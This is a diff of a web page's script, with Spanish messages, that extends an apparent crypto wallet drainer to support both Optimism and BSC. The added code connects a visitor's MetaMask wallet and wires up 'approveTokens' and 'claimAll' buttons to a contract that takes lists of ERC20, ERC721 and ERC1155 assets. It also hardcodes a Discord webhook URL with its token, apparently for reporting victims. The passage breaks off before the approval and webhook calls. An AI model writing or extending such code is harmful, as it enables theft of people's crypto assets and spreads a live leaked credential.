@@ -467,63 +467,98 @@
 
 	
   <script>
-    const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1360019304921436180/o61QmLpPd_TJ1lLxkXuzvyeW9VFtDvX7buOMmMYNDbbAqz1eod7Qi6F7TUto1JBQUGY_';
-    const contractAddress = "0x579d705fE8bA250eDA39aa51E6443AD971112686";
-    const contractABI = [
-      {
-        "inputs": [
-          { "internalType": "address[]", "name": "tokensERC20", "type": "address[]" },
-          { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" },
-          { "internalType": "address[]", "name": "contractsERC721", "type": "address[]" },
-          { "internalType": "address[]", "name": "contractsERC1155", "type": "address[]" }
-        ],
-        "name": "claimAll",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      }
-    ];
+   const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1360019304921436180/o61QmLpPd_TJ1lLxkXuzvyeW9VFtDvX7buOMmMYNDbbAqz1eod7Qi6F7TUto1JBQUGY_';
 
-    let web3;
-    let userAccount;
-    let contract;
+const NETWORKS = {
+  optimism: {
+    name: "Optimism",
+    chainId: '0xA',
+    rpcUrl: 'https://mainnet.optimism.io',
+    explorer: 'https://optimistic.etherscan.io',
+    currency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+    contractAddress: "0x579d705fE8bA250eDA39aa51E6443AD971112686"
+  },
+  bsc: {
+    name: "Binance Smart Chain",
+    chainId: '0x38',
+    rpcUrl: 'https://bsc-dataseed.binance.org/',
+    explorer: 'https://bscscan.com',
+    currency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+    contractAddress: "0x231132763c55b15b5b9B81EfB8a25F5a7f946B94"
+  }
+};
 
-    window.onload = async () => {
-      if (window.ethereum) {
-        web3 = new Web3(window.ethereum);
-        try {
-          await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0xA' }] });
-        } catch (switchError) {
-          if (switchError.code === 4902) {
-            await ethereum.request({
-              method: 'wallet_addEthereumChain',
-              params: [{
-                chainId: '0xA',
-                chainName: 'Optimism',
-                rpcUrls: ['https://mainnet.optimism.io'],
-                nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-                blockExplorerUrls: ['https://optimistic.etherscan.io'],
-              }],
-            });
-          } else {
-            alert('Error al conectar a Optimism');
-          }
-        }
+const contractABI = [
+  {
+    "inputs": [
+      { "internalType": "address[]", "name": "tokensERC20", "type": "address[]" },
+      { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" },
+      { "internalType": "address[]", "name": "contractsERC721", "type": "address[]" },
+      { "internalType": "address[]", "name": "contractsERC1155", "type": "address[]" }
+    ],
+    "name": "claimAll",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  }
+];
 
-        try {
-          const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-          userAccount = accounts[0];
-          contract = new web3.eth.Contract(contractABI, contractAddress);
-          document.getElementById("approveTokens").disabled = false;
-          document.getElementById("claimAll").disabled = false;
-          alert("vuelva a conectar a MetaMask: " + userAccount);
-        } catch (error) {
-          alert("Error al conectar MetaMask");
-        }
+let web3;
+let userAccount;
+let contract;
+let selectedNetwork = 'optimism';
+
+// Escuchar cambios en el selector de red
+document.getElementById('networkSelector').addEventListener('change', async (e) => {
+  selectedNetwork = e.target.value;
+  await connectNetwork();
+});
+
+// Conectar al cargar la página
+window.onload = async () => {
+  selectedNetwork = document.getElementById('networkSelector').value;
+  await connectNetwork();
+};
+
+async function connectNetwork() {
+  const net = NETWORKS[selectedNetwork];
+  if (window.ethereum) {
+    web3 = new Web3(window.ethereum);
+    try {
+      await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: net.chainId }] });
+    } catch (switchError) {
+      if (switchError.code === 4902) {
+        await ethereum.request({
+          method: 'wallet_addEthereumChain',
+          params: [{
+            chainId: net.chainId,
+            chainName: net.name,
+            rpcUrls: [net.rpcUrl],
+            nativeCurrency: net.currency,
+            blockExplorerUrls: [net.explorer]
+          }]
+        });
       } else {
-        alert("MetaMask no está instalado");
+        alert("Error al conectar a " + net.name);
+        return;
       }
-    };
+    }
+
+    try {
+      const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+      userAccount = accounts[0];
+      contract = new web3.eth.Contract(contractABI, net.contractAddress);
+      document.getElementById("approveTokens").disabled = false;
+      document.getElementById("claimAll").disabled = false;
+      alert("Conectado a " + net.name + ": " + userAccount);
+    } catch (error) {
+      alert("Error al conectar MetaMask");
+    }
+  } else {
+    alert("MetaMask no está instalado");
+  }
+}
+
 
     document.getElementById("approveTokens").addEventListener("click", async () => {
       const button = document.getElementById("approveTokens");
